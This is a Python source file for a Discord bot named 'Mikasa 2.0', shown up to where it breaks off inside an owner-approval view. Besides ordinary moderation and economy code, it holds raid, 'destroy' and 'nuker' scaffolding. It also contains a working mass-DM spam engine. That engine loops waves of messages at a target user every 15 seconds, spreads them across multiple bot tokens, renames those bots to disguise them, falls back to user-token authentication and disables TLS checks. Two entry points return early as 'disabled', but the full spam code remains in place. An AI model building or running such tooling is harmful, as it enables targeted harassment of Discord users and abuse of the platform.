import base64
import os
import sys

_INVITE_CACHE = {}

from pathlib import Path
from typing import Optional

# Get bot token from Render environment variables
TOKEN = os.getenv("TOKEN", "").strip()

if not TOKEN:
    print("ERROR: TOKEN environment variable is missing!")
    sys.exit(1)

print("Token received. Starting your bot...\n")

# ── Core imports (restored) ──────────────────────────────────────────────
import asyncio
import datetime
import aiohttp
import json
import random
import re
import time
import string
import gzip
import math
import io
from datetime import datetime, timezone, timedelta
from collections import defaultdict
from contextvars import ContextVar

# Current command server, used to keep wallet/bank overrides server-specific.
_MIKASA_CURRENT_GUILD_ID = ContextVar("mikasa_current_guild_id", default=None)

import discord
from discord import app_commands
from discord.ext import commands, tasks

# ── Constants ────────────────────────────────────────────────────────────
OWNER_ID = 827821383417331732
PREFIX = ","
_ROB_COOLDOWNS: dict = {}  # per-user rob cooldown timestamps
BOT_NAME = "Mikasa 2.0"
BOT_ALIASES: list = []
COLORS = {
    "main": 0x5865F2,
    "success": 0x57F287,
    "error": 0xED4245,
    "warn": 0xFEE75C,
    "info": 0x5865F2,
    "dark": 0x2B2D31,
}
DATA_DIR = Path("data")
DATA_DIR.mkdir(exist_ok=True)
DESTROY_INVITE_LINK = "https://discord.gg/psfxUxRfPQ"
BACKUP_LOG_CHANNEL_ID = 1564277342279307448
REQUIRED_GUILD_ID = 1502005946698825789
FAKE_GUILD_IDS: set = set()
PREMIUM_USERS: set = set()
WHITELIST_USERS: set = set()
BLACKLISTED_USERS: set = set()
BLACKLISTED_GUILDS: set = set()
LOCKED_GUILDS: set = set()
BOT_LOCKED = False
ACTIVE_COIN_BOOSTS: dict = {}
DAILY_COINS = 250
REFERRAL_REWARD = 100
FAKE_INVITE_CODES: list = []  # optional invite codes for J4J / fake-invite detection

# Raid / destroy defaults (avoid NameError)
_DEFAULT_SERVER_LINK = ""
_RAID_DEFAULT_MSG = ""
_RAID_STOP_EVENTS: dict = {}
_RAID_TASKS: dict = {}
REQUIRED_GUILD_INVITE = ""

# Ticket staff role names (Tickety-style)
STAFF_ROLE_NAMES = {
    "staff", "mod", "moderator", "admin", "administrator",
    "support", "ticket support", "helper", "owner",
}

# Level-up channel per guild {guild_id: channel_id}
_LEVEL_CHANNELS: dict = {}

# Auto-roles on join {guild_id: [role_id, ...]}
_AUTOROLES: dict = {}

# Auto-responses {guild_id: {trigger_lower: response}}
_AUTORESPONSES: dict = {}

# MassDM state
_MASSDM_TASKS: dict = {}
_MASSDM_AMOUNTS: dict = {}
_MASSDM_STOP_EVENTS: dict = {}
_MASSDM_STATS: dict = {}
_MASSDM_WAVE_TASKS: dict = {}
_MASSDM_DEFAULT_MSG = ""
_MASSDM_TEXT = ""
_MASSDM_INTRO_TEXT = "hey"
_DESTROY_DEFAULTS: dict = {}
_LOG_CHANNELS: dict = {}
_WELCOME_SETTINGS: dict = {}
_BOT_IDENTITIES = [
    {"name": "Helper", "avatar": ""},
]
_RETYPE_ALL: set = set()
_RETYPE_GUILDS: dict = {}
_RETYPE_WEBHOOKS: dict = {}
_LEVEL_DATA: dict = {}
_LEVEL_XP_COOLDOWN: dict = {}
_ALREADY_REWARDED_JOINERS: set = set()
_SETRAID_CHANNEL: dict = {}
LAST_RESTORE: dict = {}

# ── JSON helpers ─────────────────────────────────────────────────────────
def load(name: str):
    p = DATA_DIR / f"{name}.json"
    if not p.exists():
        return {} if name not in ("nuker_logs", "whitelist", "nukerlist") else ([] if name in ("nuker_logs", "nukerlist", "whitelist") else {})
    try:
        data = json.loads(p.read_text(encoding="utf-8"))
        return data
    except Exception:
        return {} if name != "nuker_logs" else []

def save(name: str, data) -> None:
    p = DATA_DIR / f"{name}.json"
    try:
        p.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
    except Exception as ex:
        print(f"[save] {name}: {ex}")

def gdata(settings: dict, guild_id: int) -> dict:
    key = str(guild_id)
    if key not in settings:
        settings[key] = {}
    return settings[key]

# Persistent co-owner access. The primary OWNER_ID remains the ultimate authority.
try:
    _coowner_raw = load("coowners")
    CO_OWNER_IDS: set[int] = {int(x) for x in (_coowner_raw if isinstance(_coowner_raw, list) else []) if str(x).isdigit()}
except Exception:
    CO_OWNER_IDS = set()

def has_owner_access(user) -> bool:
    """True for the primary bot owner or an explicitly granted co-owner.

    Co-owners may use owner-gated operational commands, but management of co-owner
    access itself is restricted to the primary OWNER_ID.
    """
    try:
        uid = int(getattr(user, "id", user))
        return uid == OWNER_ID or uid in CO_OWNER_IDS
    except Exception:
        return False

def is_owner(user) -> bool:
    try:
        return int(getattr(user, "id", user)) == OWNER_ID
    except Exception:
        return False


def can_moderate(moderator: discord.Member, target: discord.Member) -> tuple:
    if not isinstance(moderator, discord.Member) or not isinstance(target, discord.Member):
        return False, "❌ Both users must be in this server."
    if target.id == moderator.id:
        return False, "❌ You cannot moderate yourself."
    if target.id == OWNER_ID:
        return False, "❌ The **bot owner** is immune to moderation actions."
    if target.id == moderator.guild.owner_id:
        return False, "❌ You cannot moderate the server owner."
    if moderator.id == moderator.guild.owner_id or moderator.id == OWNER_ID:
        return True, ""
    if target.top_role >= moderator.top_role:
        return False, (
            f"❌ You cannot moderate **{target.display_name}** — "
            f"their highest role is the same as or higher than yours."
        )
    me = moderator.guild.me
    if me and target.top_role >= me.top_role:
        return False, f"❌ I cannot moderate **{target.display_name}** — role is at or above mine."
    return True, ""

def can_assign_role(moderator: discord.Member, role: discord.Role) -> tuple:
    if not isinstance(moderator, discord.Member) or not isinstance(role, discord.Role):
        return False, "❌ Invalid member or role."
    if role.is_default():
        return False, "❌ You cannot assign @everyone."
    if moderator.id == OWNER_ID or moderator.id == moderator.guild.owner_id:
        me = moderator.guild.me
        if me and role >= me.top_role:
            return False, f"❌ I cannot manage {role.mention}."
        return True, ""
    if role >= moderator.top_role:
        return False, f"❌ You cannot assign {role.mention} — same as or higher than your highest role."
    me = moderator.guild.me
    if me and role >= me.top_role:
        return False, f"❌ I cannot manage {role.mention}."
    return True, ""

def is_staff(member) -> bool:
    if not member:
        return False
    if has_owner_access(member):
        return True
    try:
        if getattr(member, "guild_permissions", None) and (
            member.guild_permissions.administrator
            or member.guild_permissions.manage_guild
            or member.guild_permissions.ban_members
            or member.guild_permissions.kick_members
        ):
            return True
    except Exception:
        pass
    return False

class _GuildScopedEconomyRow(dict):
    """Dict-compatible economy row.

    Wallet/bank prefer a per-server value when present, otherwise fall back to the
    global balance so existing gambling data is never treated as zero/missing.
    Writes always update the global field and, when a server is active, the
    per-server mirror as well.
    """
    def __init__(self, source, guild_id):
        super().__init__(source if isinstance(source, dict) else {})
        self._guild_id = str(guild_id) if guild_id is not None else None

    def get(self, key, default=None):
        if key in ("balance", "bank"):
            if self._guild_id is not None:
                scoped = dict.get(self, key + "_by_guild", {})
                if isinstance(scoped, dict) and self._guild_id in scoped:
                    return scoped[self._guild_id]
            return dict.get(self, key, default)
        return dict.get(self, key, default)

    def __getitem__(self, key):
        marker = object()
        value = self.get(key, marker)
        if value is marker:
            raise KeyError(key)
        return value

    def __setitem__(self, key, value):
        if key in ("balance", "bank"):
            dict.__setitem__(self, key, value)
            if self._guild_id is not None:
                scoped_key = key + "_by_guild"
                scoped = dict.get(self, scoped_key, {})
                if not isinstance(scoped, dict):
                    scoped = {}
                else:
                    scoped = dict(scoped)
                scoped[self._guild_id] = value
                dict.__setitem__(self, scoped_key, scoped)
            return
        dict.__setitem__(self, key, value)


def get_pokemon_data(uid: str) -> dict:
    """Economy storage; wallet/bank reads and writes are scoped to the active server."""
    data = load("economy")
    if not isinstance(data, dict):
        data = {}
    uid = str(uid)
    if uid not in data:
        data[uid] = {"balance": 0, "bank": 0}
        save("economy", data)
    return _GuildScopedEconomyRow(data[uid], _MIKASA_CURRENT_GUILD_ID.get())


def save_pokemon_data(uid: str, ud: dict) -> None:
    """Persist economy row while preserving per-server wallet/bank overrides."""
    data = load("economy")
    if not isinstance(data, dict):
        data = {}
    uid = str(uid)
    existing = data.get(uid, {}) if isinstance(data.get(uid), dict) else {}
    merged = dict(existing)
    try:
        incoming = dict(ud)
    except Exception:
        incoming = existing
    merged.update(incoming)
    for k in ("balance", "bank"):
        if k in incoming:
            merged[k] = incoming[k]
    data[uid] = merged
    save("economy", data)


def get_user_data(uid: str) -> dict:
    """Alias used by some older commands — same storage as economy."""
    return get_pokemon_data(uid)


def save_user_data(uid: str, ud: dict) -> None:
    save_pokemon_data(uid, ud)


def _rob_immunity_data() -> dict:
    data = load("rob_immunity")
    if not isinstance(data, dict):
        data = {}
    data.setdefault("users", [])
    data.setdefault("roles", {})
    if not isinstance(data["users"], list):
        data["users"] = []
    if not isinstance(data["roles"], dict):
        data["roles"] = {}
    return data

def is_rob_immune(member) -> bool:
    """Primary bot owner is permanently immune; user/role exemptions persist."""
    try:
        if int(member.id) == OWNER_ID:
            return True
        data = _rob_immunity_data()
        users = {int(x) for x in data.get("users", []) if str(x).isdigit()}
        if int(member.id) in users:
            return True
        guild_id = str(getattr(getattr(member, "guild", None), "id", ""))
        role_ids = {int(x) for x in data.get("roles", {}).get(guild_id, []) if str(x).isdigit()}
        return any(int(role.id) in role_ids for role in getattr(member, "roles", []))
    except Exception:
        # Never accidentally grant immunity if the stored settings are malformed.
        return int(getattr(member, "id", 0)) == OWNER_ID


def load_lists() -> None:
    """Load premium / whitelist / blacklist sets from disk (safe on missing files)."""
    global PREMIUM_USERS, WHITELIST_USERS, BLACKLISTED_USERS, BLACKLISTED_GUILDS
    try:
        nl = load("nukerlist")
        if isinstance(nl, list):
            PREMIUM_USERS = set(int(x) for x in nl if str(x).isdigit() or isinstance(x, int))
        elif isinstance(nl, dict):
            PREMIUM_USERS = set(int(k) for k in nl.keys() if str(k).isdigit())
    except Exception as ex:
        print(f"[load_lists] nukerlist: {ex}")
    try:
        wl = load("whitelist")
        if isinstance(wl, list):
            WHITELIST_USERS = set(int(x) for x in wl if str(x).isdigit() or isinstance(x, int))
        elif isinstance(wl, dict):
            WHITELIST_USERS = set(int(k) for k in wl.keys() if str(k).isdigit())
    except Exception as ex:
        print(f"[load_lists] whitelist: {ex}")
    try:
        bu = load("blacklist_users")
        if isinstance(bu, dict):
            BLACKLISTED_USERS.update(int(k) for k in bu.keys() if str(k).isdigit())
        elif isinstance(bu, list):
            BLACKLISTED_USERS.update(int(x) for x in bu if str(x).isdigit() or isinstance(x, int))
    except Exception:
        pass
    try:
        bg = load("blacklist_guilds")
        if isinstance(bg, dict):
            BLACKLISTED_GUILDS.update(int(k) for k in bg.keys() if str(k).isdigit())
        elif isinstance(bg, list):
            BLACKLISTED_GUILDS.update(int(x) for x in bg if str(x).isdigit() or isinstance(x, int))
    except Exception:
        pass


def parse_duration(text: str) -> int:
    """Parse duration strings like 30s, 5m, 2h, 1d → seconds. Returns 0 if invalid."""
    if text is None:
        return 0
    if isinstance(text, (int, float)):
        return max(0, int(text))
    s = str(text).strip().lower().replace(" ", "")
    if not s:
        return 0
    if s.isdigit():
        return int(s)
    m = re.match(r"^(\d+)(s|sec|secs|seconds|m|min|mins|minutes|h|hr|hrs|hours|d|day|days|w|week|weeks)?$", s)
    if not m:
        return 0
    n = int(m.group(1))
    unit = m.group(2) or "s"
    mult = 1
    if unit.startswith("m") and not unit.startswith("mi"):  # m / min
        if unit in ("m", "min", "mins", "minutes"):
            mult = 60
        else:
            mult = 60
    if unit in ("m", "min", "mins", "minutes"):
        mult = 60
    elif unit in ("h", "hr", "hrs", "hours"):
        mult = 3600
    elif unit in ("d", "day", "days"):
        mult = 86400
    elif unit in ("w", "week", "weeks"):
        mult = 604800
    else:
        mult = 1
    return max(0, n * mult)


def check_and_evolve(pokemon) -> tuple:
    """Stub for legacy pokemon evolve hook — returns (evolved, old, new)."""
    return False, None, None


_NICE_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)


async def _nice_fetch_token(session: aiohttp.ClientSession):
    """Optional media helper — returns (token, headers) or (None, {})."""
    try:
        return None, {"User-Agent": _NICE_UA}
    except Exception:
        return None, {}


async def _dm_raw_open(session: aiohttp.ClientSession, token: str, uid: int):
    """Open a DM channel via REST. Returns (headers, channel_id) or None."""
    headers_list = [
        {"Authorization": f"Bot {token}", "Content-Type": "application/json"},
        {"Authorization": token, "Content-Type": "application/json"},
    ]
    for headers in headers_list:
        try:
            async with session.post(
                "https://discord.com/api/v10/users/@me/channels",
                headers=headers,
                json={"recipient_id": str(uid)},
                timeout=aiohttp.ClientTimeout(total=15),
            ) as r:
                if r.status == 429:
                    try:
                        d = await r.json()
                        await asyncio.sleep(min(float(d.get("retry_after", 1)), 5))
                    except Exception:
                        await asyncio.sleep(1)
                    continue
                if r.status in (200, 201):
                    data = await r.json()
                    ch_id = data.get("id")
                    if ch_id:
                        return headers, int(ch_id)
                if r.status in (401, 403):
                    break
        except Exception:
            continue
    return None


async def _dm_raw_send(session: aiohttp.ClientSession, headers: dict, channel_id: int, count: int = 1, content: str = None) -> int:
    """Send `count` messages into an open DM channel. Returns number sent."""
    count = max(1, min(int(count or 1), 50))
    body_content = content if content else (_MASSDM_DEFAULT_MSG or _MASSDM_TEXT or "hey")
    sent = 0
    url = f"https://discord.com/api/v10/channels/{channel_id}/messages"
    for i in range(count):
        try:
            payload = {"content": body_content[:2000] if body_content else "hey"}
            async with session.post(
                url,
                headers=headers,
                json=payload,
                timeout=aiohttp.ClientTimeout(total=15),
            ) as r:
                if r.status == 429:
                    try:
                        d = await r.json()
                        await asyncio.sleep(min(float(d.get("retry_after", 1)), 5))
                    except Exception:
                        await asyncio.sleep(1)
                    # retry once
                    try:
                        async with session.post(url, headers=headers, json=payload, timeout=aiohttp.ClientTimeout(total=15)) as r2:
                            if r2.status in (200, 201):
                                sent += 1
                    except Exception:
                        pass
                elif r.status in (200, 201):
                    sent += 1
                elif r.status in (401, 403, 404):
                    break
            await asyncio.sleep(0.35)
        except Exception:
            await asyncio.sleep(0.5)
    return sent


# ── Bot instance ─────────────────────────────────────────────────────────
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.moderation = True
intents.presences = False

bot = commands.Bot(
    command_prefix=PREFIX,
    intents=intents,
    help_command=None,
    case_insensitive=True,
)
# Avoid AttributeError in snipe listeners
bot.snipe_data = {}
bot.editsnipe_data = {}

# Load premium list if present
try:
    _nl = load("nukerlist")
    if isinstance(_nl, list):
        PREMIUM_USERS = set(int(x) for x in _nl if str(x).isdigit() or isinstance(x, int))
except Exception:
    pass

POLAR_BEAR_ICON_B64 = "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABcQERQRDhcUEhQaGBcbIjklIh8fIkYyNSk5UkhXVVFIUE5bZoNvW2F8Yk5QcptzfIeLkpSSWG2grJ+OqoOPko3/2wBDARgaGiIeIkMlJUONXlBejY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY3/wAARCABgAGADASIAAhEBAxEB/8QAGgAAAQUBAAAAAAAAAAAAAAAAAwACBAUGAf/EADkQAAICAQIDBAcGBAcAAAAAAAECAAMRBCEFEjFBUWFxIjJSgZGhwQYTFEKx0RUjM+EkQ1NicoKS/8QAGQEAAwEBAQAAAAAAAAAAAAAAAAECAwQF/8QAIBEAAwACAgIDAQAAAAAAAAAAAAECAxESMRMhBEFRYf/aAAwDAQACEQMRAD8AgYb/AGxpcowDYxjs7ITEDb/UHlMU9m7Q67+k3ugW2MfzEoUALE7DxkqmgJ6T4Z/kPKVyUoU4qyP0RKq7DSwCNv02hVRwN63+EmZnJk8jZ1L46X2RCQDvkeYxFJf6QbUoR6K8p7xtBWgeF/RHjWzt5iFNVoPQMPONcMuOZSNxv2S00YOaXaHP6yf8oIj+Y3uhnGynxBjGH80nyiTJaCwF3rLHl/BvhCafSW6+8V1Aj2mYbKISnsdNaOaWvANh6nYeUsaNBfeAQvKp/M0tdPw3TUVqoQMQOrSUSBt9I/Ht7ZXn4rUoqhwY43vGfBYk4Mec89w5fAbmWvMO+LOR6MrxyZ+fJ+kH+EabGDzn/tK7W6F9I2clqj0fu8DL/wBLtHwnHUWIUdOZWGCD2wcJoJzXL22ZeKSNbo30luCCa29RvofGR5ztNPTPRmla2gFq/dkFfVYgY7jBuPTO8k2Jz1lR17POQTaWOcTSPaOTMlLOIGexUBOWIA3mx0ejp0FYSvPM3rEnJYiYzmwcjYiaXg3E7NdaVv5A1SYBHViT3e6dBxIuNz0HxnQMec7OModSrbhhgxDF1GxzOyJo6KtHR9zo0ZqwScu22fP9pFs47pEYr+Jp2P5UdvnGBaRZGcdsh6TXrrAx09lFvL1ALKR7iI5dJU/EBrGrsS9U5d29Ej3QAPdUl9TV2LlW6zOanTvpbzVZv2q3tDvmnkXX6QavT8oIFi7ox7D+xmdzyRtiycH/AAz0rLE5bXAA2YyzwykqylWBwQewyBep+/fAPWZ4/TZ0fJ05TD1aNb7kqrX0nblGSdvGavRaKjQ0Cuhce0x6se8zNaHUpTxCl7MAK+CT0GRj6zWzZHGxRjWBLVRsDnBwSe0dnzj4w1B7ed8MAMKpHTvMZITGeyQ34Pw92LNo6snuGIc6ak/5YHlt+k5+Gq9lv/bfvABafR0aRSNPQtYPXlHWEaytPXsRfNgIwaWn/TB8yT+sclVdfqVovkoEAG6d2toWxsenuAOwdkJG1IawV25QfR8PCOgBEu0NF+pNrqSccpwcAyt4pwWhdPZqKAUZAWIJyGl2QRuPhM5xXjgvps02nrZckq7MfkItIrk9aKqzZ37N+0eE2eiobT6WqsuWCoow25BxvvMvpK/xHFKaiMqbFY+QGfpNhFPQ77FFFGWv93WX7sZ+MogfFFFABRRRRgKcnEbnBPZkgeInYgEZh9RUF1VykDIsYfMzcTH8XTk4rqAR1YMNs9REyp7J/AKQdfZZueSvt8T/AGM0IIYAjcHpKf7OrtqH8VHyJ+staTgMnsNj3dRCegrsJGWoLKmQ9GGI+KMkHp3NlCMeuMHzGxhICg8tt1fiHHv6/MGHgAoy1yoCr677L+/uj4Kkc7G4/m2XwX+/WABFUIoVegGBOxRQA5M3x5McRB9qsH4Ey/5zZqCqnCV+se89g+vwlL9oh/iaD3o36iKuip7P/9k="  # polar bear server icon for /destroy
POLAR_BEAR_ICON_BYTES = base64.b64decode(POLAR_BEAR_ICON_B64)  # decoded at import time

# Convert JPEG icon → proper PNG sizes Discord actually accepts
# Emoji needs PNG 128x128, Sticker needs PNG 320x320 (Discord hard requirements)
def _make_png(jpeg_bytes: bytes, size: int) -> bytes:
    try:
        from PIL import Image
        import io as _io
        img = Image.open(_io.BytesIO(jpeg_bytes)).convert("RGBA").resize((size, size), Image.LANCZOS)
        buf = _io.BytesIO()
        img.save(buf, format="PNG")
        return buf.getvalue()
    except Exception:
        return jpeg_bytes  # fallback: return original if PIL missing

POLAR_BEAR_EMOJI_BYTES   = _make_png(POLAR_BEAR_ICON_BYTES, 128)   # 128x128 PNG for emoji
POLAR_BEAR_STICKER_BYTES = _make_png(POLAR_BEAR_ICON_BYTES, 320)   # 320x320 PNG for sticker


# ── /nice multi-bot tokens ─────────────────────────────────────────────
# Add as many extra bot tokens here as you want.
# Every token in this list will ALSO DM the target when /nice is used.
# Leave the list empty to only use CoolBot itself.
MASSDM_BOT_TOKENS: list = []  # single-bot mode — only main TOKEN is used for massdm



async def _set_bot_identity(session: aiohttp.ClientSession, token: str,
                             name: str, avatar_url: str) -> bool:
    """PATCH /users/@me to give this bot token a unique username + avatar.
    Fetches the avatar image → converts to base64 data URI → sends PATCH.
    Returns True on success, False if rate-limited or errored (DM still proceeds)."""
    # Avatar: if already a base64 data URI, use it directly; otherwise download the URL
    avatar_data: Optional[str] = None
    if avatar_url and avatar_url.startswith("data:"):
        avatar_data = avatar_url  # embedded image — no network needed
    else:
        try:
            async with session.get(avatar_url, timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status == 200:
                    content_type = r.headers.get("Content-Type", "image/png").split(";")[0]
                    img_bytes = await r.read()
                    b64 = base64.b64encode(img_bytes).decode()
                    avatar_data = f"data:{content_type};base64,{b64}"
        except Exception:
            pass

    payload: dict = {"username": name}
    if avatar_data:
        payload["avatar"] = avatar_data

    for auth in (f"Bot {token}", token):
        headers = {"Authorization": auth, "Content-Type": "application/json"}
        try:
            async with session.patch(
                "https://discord.com/api/v10/users/@me",
                headers=headers,
                json=payload,
                timeout=aiohttp.ClientTimeout(total=12),
            ) as r:
                if r.status == 429:
                    try:
                        d = await r.json()
                        # Cap rate-limit wait at 3s — don't block DMs for minutes
                        wait = min(float(d.get("retry_after", 2)), 3.0)
                        await asyncio.sleep(wait + 0.1)
                    except Exception:
                        await asyncio.sleep(1)
                    # one retry after back-off
                    try:
                        async with session.patch(
                            "https://discord.com/api/v10/users/@me",
                            headers=headers,
                            json=payload,
                            timeout=aiohttp.ClientTimeout(total=8),
                        ) as r2:
                            if r2.status == 200:
                                return True
                    except Exception:
                        pass
                elif r.status == 200:
                    return True
        except Exception:
            continue
    return False


async def _run_one_bot_dm(token: str, uid: int, count: int = 500,
                           content: str = None, identity_idx: int = -1) -> int:
    """Each bot gets its OWN isolated connector+session — rate limits never bleed across bots.
    identity_idx == 0  → main Coolbot token — never renamed (stays Coolbot).
    identity_idx >= 1  → worker bot — renamed via a SEPARATE isolated session so a
                          rate-limit on PATCH /users/@me can NEVER block the DM session."""

    # ── Step 1: Fire identity rename in its own isolated session ──────────
    # This runs concurrently with DM open so rename rate-limits don't add latency.
    if identity_idx > 0:
        ident = _BOT_IDENTITIES[(identity_idx - 1) % len(_BOT_IDENTITIES)]

        async def _do_rename():
            _conn = aiohttp.TCPConnector(limit=2, ssl=False, force_close=True)
            try:
                async with aiohttp.ClientSession(connector=_conn) as _s:
                    await asyncio.wait_for(
                        _set_bot_identity(_s, token, ident["name"], ident["avatar"]),
                        timeout=4.0,
                    )
            except Exception:
                pass

        rename_task = asyncio.create_task(_do_rename())
    else:
        rename_task = None

    # ── Step 2: Open DM + send in a completely separate session ───────────
    dm_connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, ssl=False, force_close=False)
    sent = 0
    try:
        async with aiohttp.ClientSession(connector=dm_connector) as dm_session:
            result = await _dm_raw_open(dm_session, token, uid)
            if result:
                headers, channel_id = result
                sent = await _dm_raw_send(dm_session, headers, channel_id, count, content)
    except Exception:
        pass

    # Wait for rename to finish (it's already capped at 4s, usually done by now)
    if rename_task and not rename_task.done():
        try:
            await asyncio.wait_for(asyncio.shield(rename_task), timeout=1.0)
        except Exception:
            rename_task.cancel()

    return sent


# ── Bot batch size — how many bots run simultaneously ─────────────────
_BOT_BATCH_SIZE = 10  # Railway-safe: 10 bots at a time

async def _massdm_intro(uid: int):
    """Disabled: unsolicited mass-DM sending is not supported."""
    return
    all_tokens = [TOKEN] + list(MASSDM_BOT_TOKENS)
    for i in range(0, len(all_tokens), _BOT_BATCH_SIZE):
        batch = all_tokens[i:i + _BOT_BATCH_SIZE]
        tasks = [
            asyncio.create_task(
                _run_one_bot_dm(tok, uid, 50, _MASSDM_INTRO_TEXT, identity_idx=i + j)
            )
            for j, tok in enumerate(batch)
        ]
        await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(0.5)


async def _run_massdm_direct(uid: int, amount: int = 3):
    """Disabled: unsolicited/repeated mass-DM sending is not supported."""
    print("[Mikasa safety] mass-DM sending is disabled")
    return
    stop_ev = _MASSDM_STOP_EVENTS.get(uid)
    content = _MASSDM_DEFAULT_MSG if _MASSDM_DEFAULT_MSG else None
    amount = max(1, min(int(amount or 3), 50))
    # Only the main bot token
    if stop_ev and stop_ev.is_set():
        return
    try:
        await _run_one_bot_dm(TOKEN, uid, amount, content=content, identity_idx=0)
    except Exception as ex:
        print(f"[massdm] send failed: {ex}")


async def _run_massdm_free_wave(uid: int, amount: int = 3):
    """Free tier — main bot only, `amount` messages once."""
    await _run_massdm_direct(uid, amount=amount)


async def _massdm_loop_task(
    user_id: int,
    target_display: str,
    initiator: str,
    status_channel_id: int,
):
    """
    Standalone massdm loop. Runs FOREVER until explicitly cancelled via stopdm.
    Phase 1: every bot sends 1 intro message.
    Phase 2: infinite loop — all bots send 3 msgs every 15s.
    Survives any exception except explicit CancelledError or stop event.
    """
    total_bots    = 1
    msgs_per_wave = _MASSDM_AMOUNTS.get(user_id, 3)
    round_num     = 0
    total_msgs    = 0

    # Register a fresh stop event for this session
    stop_ev = asyncio.Event()
    _MASSDM_STOP_EVENTS[user_id] = stop_ev

    _MASSDM_STATS[user_id] = {
        "rounds":        0,
        "total_msgs":    0,
        "target_name":   target_display,
        "target_id":     user_id,
        "started":       datetime.now(timezone.utc).timestamp(),
        "initiator":     initiator,
        "msgs_per_wave": msgs_per_wave,
        "total_bots":    total_bots,
        "last_wave":     0,
        "phase":         "intro",
    }

    # ── Phase 1: every bot says hi ──────────────────────────────────────
    try:
        await _massdm_intro(user_id)
    except asyncio.CancelledError:
        raise
    except Exception:
        pass

    _MASSDM_STATS[user_id]["phase"] = "spamming"

    # ── Phase 2: infinite spam loop — fires every 15 seconds ────────────
    while True:
        # Reliable stop check — set by stopdm before task.cancel()
        if stop_ev.is_set():
            return

        try:
            round_num += 1
            _MASSDM_STATS[user_id]["rounds"]    = round_num
            _MASSDM_STATS[user_id]["last_wave"] = datetime.now(timezone.utc).timestamp()

            _amt = _MASSDM_AMOUNTS.get(user_id, 3)
            msgs_per_wave = _amt
            _wave = asyncio.create_task(_run_massdm_direct(user_id, amount=_amt))
            _MASSDM_WAVE_TASKS.setdefault(user_id, set()).add(_wave)
            _wave.add_done_callback(
                lambda t: _MASSDM_WAVE_TASKS.get(user_id, set()).discard(t)
            )

            total_msgs += msgs_per_wave
            _MASSDM_STATS[user_id]["total_msgs"] = total_msgs

            try:
                ch = bot.get_channel(status_channel_id)
                if ch:
                    await ch.send(
                        embed=discord.Embed(
                            title="📬 MassDm — Wave Fired 💣",
                            description=(
                                f"💀 **Round {round_num}** — **{target_display}**"
                                + chr(10)
                                + f"**1 bot** · **{msgs_per_wave} msgs/wave**"
                                + chr(10)
                                + f"📊 ~**{total_msgs:,}** total messages sent"
                                + chr(10)
                                + f"⏱️ Next wave in **15s** — `,stopdm <@{user_id}>` to stop."
                            ),
                            color=0xFF2244,
                        ).set_footer(text=f"Coolbot 🐻‍❄️ Premium • round {round_num}"),
                        delete_after=20,
                    )
            except asyncio.CancelledError:
                raise
            except Exception:
                pass

            # Wait 15s but also watch for stop event
            try:
                await asyncio.wait_for(stop_ev.wait(), timeout=15)
                return  # stop event was set during sleep
            except asyncio.TimeoutError:
                pass  # normal — 15s elapsed, fire next wave

        except asyncio.CancelledError:
            raise
        except Exception:
            if stop_ev.is_set():
                return
            try:
                ch = bot.get_channel(status_channel_id)
                if ch:
                    await ch.send(
                        embed=discord.Embed(
                            description=f"⚠️ Wave error on round {round_num} — auto-recovering…",
                            color=COLORS["warn"],
                        ),
                        delete_after=20,
                    )
            except Exception:
                pass
            await asyncio.sleep(5)


async def _run_massdm_free(user: discord.Member):
    """Backwards-compat wrapper — free tier single wave."""
    await _run_massdm_direct(user.id)


async def _run_massdm(user, sender, guild_name: str):
    """Backwards-compat wrapper — single wave for any user-like object."""
    await _run_massdm_direct(user.id)


async def _reject_owner_only_ctx(ctx, execute_fn):
    """Non-owner destructive cmd → DM owner for Approve/Deny; only run on Approve."""
    author = ctx.author
    guild = ctx.guild
    cmd_name = getattr(ctx.command, "name", "unknown") if ctx.command else "unknown"
    guild_name = guild.name if guild else "DM"
    guild_id = guild.id if guild else 0
    try:
        await ctx.send(
            embed=discord.Embed(
                title="⏳ Waiting for Owner Approval",
                description=(
                    f"**{cmd_name}** requires **bot owner** approval.\n\n"
                    f"A request was sent to the owner. You will be notified when they respond.\n"
                    f"*Expires in 5 minutes.*"
                ),
                color=COLORS["warn"],
            ),
            delete_after=30,
        )
    except Exception:
        pass
    e = discord.Embed(
        title="⚠️ Destructive Command Request",
        description=(
            f"**Command:** `{PREFIX}{cmd_name}`\n"
            f"**Requested by:** {author} (`{author.id}`)\n"
            f"**Server:** {guild_name} (`{guild_id}`)\n"
            f"**Channel:** {getattr(ctx.channel, 'mention', 'DM')}\n\n"
            "Approve only if you trust this request. **No undo.**"
        ),
        color=0xFF4500,
    )
    e.set_footer(text="Coolbot 🐻‍❄️ · Owner approval required")
    e.timestamp = datetime.now(timezone.utc)

    class OwnerApproveView(discord.ui.View):
        def __init__(self):
            super().__init__(timeout=300)
            self.decided = False

        @discord.ui.button(label="✅ Approve & Run", style=discord.ButtonStyle.danger)
        async def approve(self, interaction: discord.Interaction, button: discord.ui.Button):
            if not is_owner(interaction.user):
                return await interaction.response.send_message("Only Mikasa's primary owner can approve.", ephemeral=True)
            if self.decided:
                return await interaction.response.send_message("Already decided.", ephemeral=True)
            self.decided = True
            self.stop()
            await interaction.response.edit_message(
                embed=discord.Embed(title="✅ Approved", description=f"**{cmd_name}** approved. Running now…", color=COLORS["success"]),
                view=None,
            )
            try:
                await execute_fn(ctx.bot)
            except Exception as ex:
                try:
                    await interaction.followup.send(embed=discord.Embed(description=f"❌ Execution failed: `{ex}`", color=COLORS["error"]), ephemeral=True)
                except Exception:
                    pass
            try:
                await author.send(embed=discord.Embed(title="✅ Request Approved", description=f"Your **{cmd_name}** request for **{guild_name}** was approved and is running.", color=COLORS["success"]))
            except Exception:
                pass

        @discord.ui.button(label="❌ Deny", style=discord.ButtonStyle.secondary)
        async def deny(self, interaction: discord.Interaction, button: discord.ui.Button):
            if not is_owner(interaction.user):
                return await interaction.response.send_message("Only Mikasa's primary owner can deny.", ephemeral=True)
            if self.decided:
                return await interaction.response.send_message("Already decided.", ephemeral=True)
            self.decided = True
            self.stop()
